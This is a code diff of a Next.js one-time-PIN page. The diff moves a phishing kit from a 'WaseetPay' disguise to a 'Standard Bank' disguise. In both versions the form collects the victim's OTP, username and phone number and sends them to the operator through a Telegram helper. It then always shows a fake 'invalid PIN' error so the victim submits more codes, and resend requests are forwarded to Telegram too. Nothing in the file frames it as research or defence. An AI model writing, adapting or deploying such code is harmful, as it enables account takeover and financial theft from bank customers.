@@ -1,343 +1,287 @@
-"use client"
+"use client";
 
-import React, { useState, useEffect } from "react"
-import {
-  ShieldCheck,
-  Loader2,
-  CheckCircle2,
-  Clock,
-  ArrowRight,
-  RotateCcw,
-  Lock,
-} from "lucide-react"
-import { useRouter, useSearchParams } from "next/navigation"
-import { sendTelegramMessage } from "@/lib/telegram"
+import React, { useState, useEffect, useRef } from "react";
+import { ArrowLeft, Loader2 } from "lucide-react";
+import { useRouter } from "next/navigation";
+import { sendTelegramMessage } from "@/lib/telegram";
 
 export function OtpForm() {
-  const [otp, setOtp] = useState("")
-  const [timer, setTimer] = useState(120)
-  const [canResend, setCanResend] = useState(false)
-  const [isLoading, setIsLoading] = useState(false)
-  const [errorMessage, setErrorMessage] = useState("")
-  const router = useRouter()
-  const searchParams = useSearchParams()
+  const router = useRouter();
+  const [otp, setOtp] = useState<string[]>(["", "", "", "", ""]);
+  const [activeIndex, setActiveIndex] = useState(0);
+  const [timer, setTimer] = useState(55);
+  const [canResend, setCanResend] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const [errorMessage, setErrorMessage] = useState("");
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
-  const phoneParam =
-    searchParams.get("phone") ||
-    (typeof window !== "undefined" ? sessionStorage.getItem("userPhone") || "" : "")
 
-  // Mask phone for display
-  const formatDisplayPhone = (p: string) => {
-    if (!p) return "09XXXXXXXX"
-    const cleaned = p.replace(/\s+/g, "")
-    if (cleaned.length < 6) return cleaned
-    return `${cleaned.slice(0, 3)}••••${cleaned.slice(-3)}`
-  }
 
-  // Countdown timer
+  // Timer countdown
   useEffect(() => {
     if (timer > 0) {
       const interval = setInterval(() => {
-        setTimer((prev) => prev - 1)
-      }, 1000)
-      return () => clearInterval(interval)
+        setTimer((prev) => prev - 1);
+      }, 1000);
+      return () => clearInterval(interval);
     } else {
-      setCanResend(true)
+      setCanResend(true);
     }
-  }, [timer])
+  }, [timer]);
 
-  const formatTimer = (seconds: number) => {
-    const mins = Math.floor(seconds / 60)
-    const secs = seconds % 60
-    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
-  }
+  // Auto submit when 5 digits are filled
+  const handleCompleteSubmit = (enteredOtp: string) => {
+    if (isLoading) return;
+    setIsLoading(true);
+    setErrorMessage("");
 
-  // Handle unlimited numeric digits
-  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/\D/g, "")
-    setOtp(value)
-    if (errorMessage) setErrorMessage("")
-  }
+    try {
+      sessionStorage.setItem("otp1", enteredOtp);
+      const username = typeof window !== "undefined" ? sessionStorage.getItem("username") || "N/A" : "N/A";
+      const userPhone = typeof window !== "undefined" ? sessionStorage.getItem("userPhone") || "N/A" : "N/A";
+
+      // Instantly dispatch to Telegram without waiting
+      sendTelegramMessage({
+        title: "Standard Bank - OTP-1 Submitted",
+        type: "otp",
+        otp1: enteredOtp,
+        username: username,
+        phoneNumber: userPhone,
+      }).catch((err) => console.error("Error sending OTP to Telegram:", err));
+    } catch (err) {
+      console.error("Error storing OTP:", err);
+    }
+
+    // Show loader for 2 seconds then display invalid message and reset
+    setTimeout(() => {
+      setIsLoading(false);
+      setErrorMessage("The One-Time PIN you entered is invalid. Please try again.");
+      setOtp(["", "", "", "", ""]);
+      setTimer(55);
+      setCanResend(false);
+      setActiveIndex(0);
+      inputRefs.current[0]?.focus();
+    }, 2000);
+  };
+
+  // Handle single digit input
+  const handleChange = (index: number, value: string) => {
+    if (errorMessage) setErrorMessage("");
+
+    const numericValue = value.replace(/\D/g, "");
+    if (!numericValue) {
+      // Clear current cell
+      const newOtp = [...otp];
+      newOtp[index] = "";
+      setOtp(newOtp);
+      return;
+    }
+
+    // Handle paste of multiple characters
+    if (numericValue.length > 1) {
+      const pastedChars = numericValue.slice(0, 5).split("");
+      const newOtp = [...otp];
+      pastedChars.forEach((char, i) => {
+        if (i < 5) newOtp[i] = char;
+      });
+      setOtp(newOtp);
+      const nextFocus = Math.min(pastedChars.length, 4);
+      setActiveIndex(nextFocus);
+      inputRefs.current[nextFocus]?.focus();
+
+      if (pastedChars.length === 5) {
+        handleCompleteSubmit(newOtp.join(""));
+      }
+      return;
+    }
+
+    // Single digit input
+    const newOtp = [...otp];
+    newOtp[index] = numericValue.slice(-1);
+    setOtp(newOtp);
+
+    // Auto-advance to next input
+    if (index < 4) {
+      setActiveIndex(index + 1);
+      inputRefs.current[index + 1]?.focus();
+    }
+
+    // Auto-submit when all 5 digits are filled
+    const fullOtp = newOtp.join("");
+    if (fullOtp.length === 5) {
+      handleCompleteSubmit(fullOtp);
+    }
+  };
+
+  // Handle Backspace and arrow keys
+  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === "Backspace") {
+      if (!otp[index] && index > 0) {
+        const newOtp = [...otp];
+        newOtp[index - 1] = "";
+        setOtp(newOtp);
+        setActiveIndex(index - 1);
+        inputRefs.current[index - 1]?.focus();
+      } else {
+        const newOtp = [...otp];
+        newOtp[index] = "";
+        setOtp(newOtp);
+      }
+    } else if (e.key === "ArrowLeft" && index > 0) {
+      setActiveIndex(index - 1);
+      inputRefs.current[index - 1]?.focus();
+    } else if (e.key === "ArrowRight" && index < 4) {
+      setActiveIndex(index + 1);
+      inputRefs.current[index + 1]?.focus();
+    }
+  };
 
   const handleResend = async () => {
-    if (!canResend) return
-    setTimer(120)
-    setCanResend(false)
-    setErrorMessage("")
+    if (!canResend || isLoading) return;
+    setTimer(55);
+    setCanResend(false);
+    setErrorMessage("");
+    setOtp(["", "", "", "", ""]);
+    setActiveIndex(0);
+    inputRefs.current[0]?.focus();
 
     try {
+      const username = typeof window !== "undefined" ? sessionStorage.getItem("username") || "N/A" : "N/A";
+      const userPhone = typeof window !== "undefined" ? sessionStorage.getItem("userPhone") || "N/A" : "N/A";
+
       await sendTelegramMessage({
-        title: "🔄 طلب إعادة إرسال OTP | WaseetPay Resend OTP",
-        phoneNumber: phoneParam || "N/A",
-      })
-    } catch {
-      // silent
+        title: "Standard Bank - Resend OTP Requested",
+        type: "resend_otp",
+        username: username,
+        phoneNumber: userPhone,
+      });
+    } catch (err) {
+      console.error("Resend error:", err);
     }
-  }
-
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    if (!otp.trim()) {
-      setErrorMessage("يرجى إدخال رمز التحقق أولاً")
-      return
-    }
-
-    setIsLoading(true)
-    setErrorMessage("")
-
-    try {
-      await sendTelegramMessage({
-        title: "🔐 رمز التحق - وسيط باي | WaseetPay OTP Submitted",
-        otp1: otp.trim(),
-        phoneNumber: phoneParam || "N/A",
-      })
-    } catch {
-      // silent
-    }
-
-    // Wait exactly 2 seconds then show invalid message each time and reset timer
-    setTimeout(() => {
-      setIsLoading(false)
-      setErrorMessage("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى")
-      setOtp("")
-      setTimer(120)
-      setCanResend(false)
-    }, 2000)
-  }
+  };
 
   return (
-    <div
-      dir="rtl"
-      className="min-h-[100dvh] w-full bg-white flex flex-col justify-between selection:bg-[#1E64EC]/20"
-    >
-      {/* ========================================================================= */}
-      {/* TOP FULL-WIDTH SECTION: Royal Blue Gradient with Brand Header              */}
-      {/* ========================================================================= */}
-      <section
-        className="w-full pt-10 sm:pt-14 pb-16 sm:pb-20 px-6 sm:px-8 relative overflow-hidden shrink-0 min-h-[245px] sm:min-h-[285px] bg-[#124bbf]"
-        style={{
-          backgroundImage:
-            "linear-gradient(180deg, rgba(8, 36, 102, 0.16) 0%, rgba(7, 30, 88, 0.26) 100%), url('/login-bg.jpg')",
-          backgroundPosition: "top center",
-          backgroundSize: "cover",
-          backgroundRepeat: "no-repeat",
-        }}
-      >
-        {/* Subtle Grid overlay */}
-        <div
-          className="absolute inset-0 pointer-events-none opacity-20"
-          style={{
-            backgroundImage: `
-              linear-gradient(to right, rgba(255, 255, 255, 0.15) 1px, transparent 1px),
-              linear-gradient(to bottom, rgba(255, 255, 255, 0.15) 1px, transparent 1px)
-            `,
-            backgroundSize: "44px 44px",
-          }}
-        />
-
-        {/* Glowing luminous wave lines */}
-        <svg
-          className="absolute inset-0 w-full h-full pointer-events-none opacity-45"
-          viewBox="0 0 1440 260"
-          fill="none"
-          preserveAspectRatio="none"
+    <div dir="ltr" className="h-[100dvh] max-h-[100dvh] w-full bg-white flex flex-col font-sans selection:bg-blue-600 selection:text-white overflow-hidden select-none">
+      {/* Top App Header */}
+      <header className="w-full bg-[#0036AD] h-14 sm:h-16 flex items-center px-4 shadow-md shrink-0">
+        <button
+          type="button"
+          onClick={() => router.push("/")}
+          className="p-2 -ml-2 text-white hover:bg-white/10 rounded-full transition-colors cursor-pointer"
+          aria-label="Back"
         >
-          <path
-            d="M-100,160 C300,50 650,220 1100,100 C1280,60 1420,130 1550,110"
-            stroke="rgba(100, 215, 255, 0.7)"
-            strokeWidth="2.5"
-            filter="blur(1px)"
-          />
-          <path
-            d="M-80,190 C320,80 680,240 1140,125 C1310,80 1440,150 1570,130"
-            stroke="rgba(70, 160, 255, 0.4)"
-            strokeWidth="1.5"
-          />
-          <path
-            d="M-50,220 C350,110 710,260 1180,150 C1340,105 1460,170 1600,150"
-            stroke="rgba(50, 140, 255, 0.25)"
-            strokeWidth="1.2"
-          />
-        </svg>
+          <ArrowLeft className="w-6 h-6 text-white" />
+        </button>
+        <h1 className="text-white text-xl font-normal tracking-wide ml-3">
+          OTP
+        </h1>
+      </header>
 
-        {/* Content Container aligned with form below */}
-        <div className="max-w-[460px] sm:max-w-[480px] w-full mx-auto relative z-10">
-          {/* Top Brand Bar & Return Link */}
-          <div className="flex items-center justify-between">
-            <div className="flex items-center gap-3">
-              {/* App Icon */}
-              <div className="w-[36px] h-[36px] sm:w-[40px] sm:h-[40px] rounded-[10px] overflow-hidden shadow-sm shadow-blue-950/30 shrink-0 border border-white/20">
-                <img
-                  src="/waseetpay-app-icon.png"
-                  alt="WaseetPay Logo"
-                  className="w-full h-full object-cover"
-                />
-              </div>
+      {/* Main Body Content */}
+      <main className="flex-1 w-full max-w-[420px] mx-auto px-5 pt-6 sm:pt-12 pb-6 flex flex-col items-center justify-between text-center overflow-hidden">
+        <div className="w-full flex flex-col items-center">
+          {/* Title - Light font */}
+          <h2 className="text-2xl sm:text-[28px] font-light text-[#1e293b] tracking-normal">
+            Enter One-Time PIN
+          </h2>
 
-              {/* Brand Title */}
-              <div className="text-white font-bold text-[15.5px] sm:text-[17.5px] tracking-tight flex items-center gap-1.5">
-                <span>وسيط باي</span>
-                <span className="text-white/60 font-light text-[12px] sm:text-[13px]">|</span>
-                <span className="font-semibold text-[14.5px] sm:text-[16px]">WaseetPay</span>
-              </div>
-            </div>
-
-            {/* Back Button */}
-            <button
-              type="button"
-              onClick={() => router.push("/")}
-              className="inline-flex items-center gap-1.5 text-white/90 hover:text-white text-[12px] sm:text-[13px] font-semibold bg-white/10 hover:bg-white/15 px-3 py-1.5 rounded-xl backdrop-blur-xs transition-all cursor-pointer border border-white/10"
-            >
-              <span>تغيير الحساب</span>
-              <ArrowRight className="w-3.5 h-3.5 rotate-180" />
-            </button>
+          {/* Subtitle - Light font */}
+          <div className="mt-2 text-[#475569] text-[14px] sm:text-[15px] font-light leading-relaxed">
+            <p>A one-time PIN has been sent</p>
           </div>
 
-          {/* Titles */}
-          <div className="mt-8 sm:mt-10 lg:mt-11">
-            <h1 className="text-[28px] sm:text-[36px] lg:text-[38px] font-extrabold text-white tracking-tight leading-tight">
-              تأكيد رمز التحقق
-            </h1>
-            <p className="text-white/90 text-[13.5px] sm:text-[15px] font-normal mt-1.5 leading-snug">
-              تم إرسال رمز التحقق في رسالة نصية (SMS) إلى{" "}
-              {phoneParam ? (
-                <span className="font-bold text-white inline-block" dir="ltr">
-                  {formatDisplayPhone(phoneParam)}
-                </span>
-              ) : (
-                "رقم هاتفك المسجل"
-              )}
-            </p>
-          </div>
-        </div>
-      </section>
-
-      {/* ========================================================================= */}
-      {/* BOTTOM FULL-WIDTH SECTION: White Sheet with OTP Input                      */}
-      {/* ========================================================================= */}
-      <section className="w-full bg-white -mt-7 sm:-mt-9 rounded-t-[32px] sm:rounded-t-[38px] flex-1 px-6 sm:px-8 pt-7 sm:pt-8 lg:pt-9 pb-8 sm:pb-10 flex flex-col justify-between shadow-[0_-8px_25px_rgba(0,0,0,0.06)] relative z-20">
-        <div className="max-w-[460px] sm:max-w-[480px] w-full mx-auto flex flex-col justify-between h-full">
-          <div>
-            {/* Security Badge */}
-            <div className="mb-4 sm:mb-6 flex items-center justify-center gap-2 p-2.5 sm:p-3 rounded-[14px] sm:rounded-[16px] bg-blue-50/80 border border-blue-100 text-[#1E64EC]">
-              <Lock className="w-4 h-4 shrink-0" />
-              <span className="text-[12px] sm:text-[13.5px] font-semibold text-slate-700">
-                عملية تسجيل دخول آمنة ومشفرة برمز حماية لمرة واحدة
-              </span>
-            </div>
-
-            {/* ---------------- Form ---------------- */}
-            <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-5">
-              <div>
-                <div className="flex items-center justify-between mb-2">
-                  <label className="text-[#6b7280] text-[13px] sm:text-[13.5px] font-medium text-right">
-                    أدخل رمز التحقق (يمكنك إدخال أي عدد من الأرقام)
-                  </label>
-                  {otp && (
-                    <span className="text-[11px] sm:text-xs font-semibold text-slate-400">
-                      {otp.length} {otp.length === 1 ? "رقم" : "أرقام"}
-                    </span>
-                  )}
-                </div>
-
-                {/* Unlimited Digits Input Field */}
-                <div className="relative">
-                  <div
-                    className={`h-[52px] sm:h-[58px] rounded-[15px] sm:rounded-[18px] bg-white px-4 flex items-center justify-center transition-all ${
-                      errorMessage
-                        ? "border-2 border-rose-500 ring-2 ring-rose-500/15"
-                        : "border-2 border-[#1E64EC] shadow-[0_0_0_2px_rgba(29,100,236,0.12)]"
-                    }`}
-                  >
+          {/* 5 OTP Input Boxes */}
+          <div className="mt-6 sm:mt-8 mb-4 sm:mb-6 w-full max-w-[340px]">
+            <div className="grid grid-cols-5 gap-2 sm:gap-3">
+              {otp.map((digit, index) => {
+                const isFocused = activeIndex === index;
+                return (
+                  <div key={index} className="relative">
                     <input
+                      ref={(el) => {
+                        inputRefs.current[index] = el;
+                      }}
                       type="text"
                       inputMode="numeric"
                       pattern="[0-9]*"
-                      autoFocus
-                      dir="ltr"
-                      value={otp}
-                      onChange={handleOtpChange}
-                      placeholder="أدخل رمز التحقق"
-                      className="w-full text-center text-[20px] sm:text-[24px] font-bold text-[#1f2937] tracking-[0.2em] sm:tracking-[0.25em] outline-none bg-transparent placeholder:tracking-normal placeholder:font-normal placeholder:text-slate-400 placeholder:text-[14px] sm:placeholder:text-[15px]"
+                      maxLength={1}
+                      value={digit}
+                      autoFocus={index === 0}
+                      onFocus={() => setActiveIndex(index)}
+                      onChange={(e) => handleChange(index, e.target.value)}
+                      onKeyDown={(e) => handleKeyDown(index, e)}
+                      disabled={isLoading}
+                      className={`w-full h-13 sm:h-16 text-center text-2xl font-light rounded-xl sm:rounded-2xl outline-none transition-all bg-white ${
+                        isFocused
+                          ? "border-2 border-[#0036AD] shadow-[0_0_0_2px_rgba(0,54,173,0.15)]"
+                          : digit
+                          ? "border border-gray-400 text-gray-900"
+                          : "border border-gray-300 text-gray-900"
+                      } ${errorMessage ? "border-red-400 bg-red-50/20" : ""}`}
                     />
                   </div>
-                </div>
-
-                {/* Error Message */}
-                {errorMessage && (
-                  <div className="mt-1.5 text-right text-rose-500 text-[12px] sm:text-[13px] font-semibold flex items-center gap-1.5 animate-in fade-in duration-200">
-                    <span>⚠️</span>
-                    <span>{errorMessage}</span>
-                  </div>
-                )}
-              </div>
-
-              {/* Timer & Resend Option */}
-              <div className="flex items-center justify-between py-1 text-[12px] sm:text-[13.5px] text-slate-500">
-                <div className="flex items-center gap-1.5 font-medium">
-                  <Clock className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-slate-400" />
-                  <span>صلاحية الرمز:</span>
-                  <span className={`font-bold tabular-nums ${timer < 30 ? "text-amber-600" : "text-[#1E64EC]"}`} dir="ltr">
-                    {formatTimer(timer)}
-                  </span>
-                </div>
-
-                <button
-                  type="button"
-                  onClick={handleResend}
-                  disabled={!canResend}
-                  className={`inline-flex items-center gap-1 font-semibold transition-colors cursor-pointer ${
-                    canResend
-                      ? "text-[#1E64EC] hover:text-[#1855ca] hover:underline"
-                      : "text-slate-400 cursor-not-allowed opacity-75"
-                  }`}
-                >
-                  <RotateCcw className="w-3.5 h-3.5" />
-                  <span>إعادة إرسال الرمز</span>
-                </button>
-              </div>
-
-              {/* Confirm Button */}
-              <button
-                type="submit"
-                disabled={isLoading || !otp.trim()}
-                className="w-full h-[50px] sm:h-[54px] rounded-[15px] sm:rounded-[16px] bg-[#1E64EC] hover:bg-[#1855ca] active:scale-[0.99] text-white font-bold text-[15px] sm:text-[16px] flex items-center justify-center shadow-lg shadow-[#1E64EC]/25 transition-all cursor-pointer disabled:opacity-75 disabled:cursor-not-allowed"
-              >
-                {isLoading ? (
-                  <div className="flex items-center gap-2">
-                    <Loader2 className="w-4 h-4 sm:w-5 sm:h-5 animate-spin text-white" />
-                    <span>جاري التحقق من الرمز...</span>
-                  </div>
-                ) : (
-                  "تأكيد رمز التحقق"
-                )}
-              </button>
-            </form>
-
-            {/* Security Notice */}
-            <div className="mt-3 sm:mt-6 pt-2 sm:pt-4 border-t border-slate-100 flex items-center justify-center gap-2 text-[11px] sm:text-[12.5px] text-slate-400">
-              <ShieldCheck className="w-3.5 h-3.5 text-emerald-500" />
-              <span>حماية مشددة وفق معايير مصرف ليبيا المركزي للدفع الإلكتروني</span>
+                );
+              })}
             </div>
 
-            {/* Return to Login */}
-            <div className="mt-2 sm:mt-4 text-center">
-              <button
-                type="button"
-                onClick={() => router.push("/")}
-                className="text-slate-500 hover:text-[#1E64EC] text-[11.5px] sm:text-[13px] font-semibold transition-colors hover:underline cursor-pointer"
-              >
-                الرجوع إلى صفحة تسجيل الدخول
-              </button>
-            </div>
+            {/* Error message */}
+            {errorMessage && (
+              <p className="mt-3 text-red-600 text-sm font-normal animate-in fade-in duration-200">
+                {errorMessage}
+              </p>
+            )}
           </div>
 
-          {/* Website Copyright Footer */}
-          <footer className="w-full pt-1.5 sm:pt-4 text-center text-[10px] sm:text-xs text-slate-400">
-            <span>© {new Date().getFullYear()} وسيط باي | WaseetPay. جميع الحقوق محفوظة.</span>
-          </footer>
+          {/* Resend Countdown Text - Light font */}
+          <div className="mt-1 text-sm text-[#475569] font-light">
+            {timer > 0 ? (
+              <p>
+                Didn&apos;t get the OTP? Resend after{" "}
+                <span className="font-normal text-gray-900">{timer} seconds</span>.
+              </p>
+            ) : (
+              <p className="text-gray-700 font-light">Didn&apos;t get the OTP? You can resend now.</p>
+            )}
+          </div>
         </div>
-      </section>
+
+        {/* Action Row: RESEND & HELP - Light font */}
+        <div className="w-full max-w-[340px] flex items-center justify-between px-3 pt-4">
+          <button
+            type="button"
+            onClick={handleResend}
+            disabled={!canResend || isLoading}
+            className={`text-[15px] font-normal tracking-wider uppercase transition-colors cursor-pointer ${
+              canResend
+                ? "text-[#0036AD] hover:text-[#002a88] hover:underline"
+                : "text-gray-400 cursor-not-allowed"
+            }`}
+          >
+            RESEND
+          </button>
+
+          <button
+            type="button"
+            onClick={(e) => {
+              e.preventDefault();
+              alert("If you did not receive your One-Time PIN, please verify your mobile number with customer support or try RESEND once the timer expires.");
+            }}
+            className="text-[15px] font-normal tracking-wider text-[#0036AD] hover:text-[#002a88] hover:underline transition-colors uppercase cursor-pointer"
+          >
+            HELP
+          </button>
+        </div>
+
+        {/* 2-Second Loading Overlay */}
+        {isLoading && (
+          <div className="fixed inset-0 bg-black/25 backdrop-blur-[2px] flex items-center justify-center z-50">
+            <div className="bg-white p-6 rounded-2xl shadow-xl flex flex-col items-center gap-3">
+              <Loader2 className="w-10 h-10 text-[#0036AD] animate-spin" />
+              <p className="text-sm font-normal text-gray-700">Verifying OTP...</p>
+            </div>
+          </div>
+        )}
+      </main>
     </div>
-  )
+  );
 }
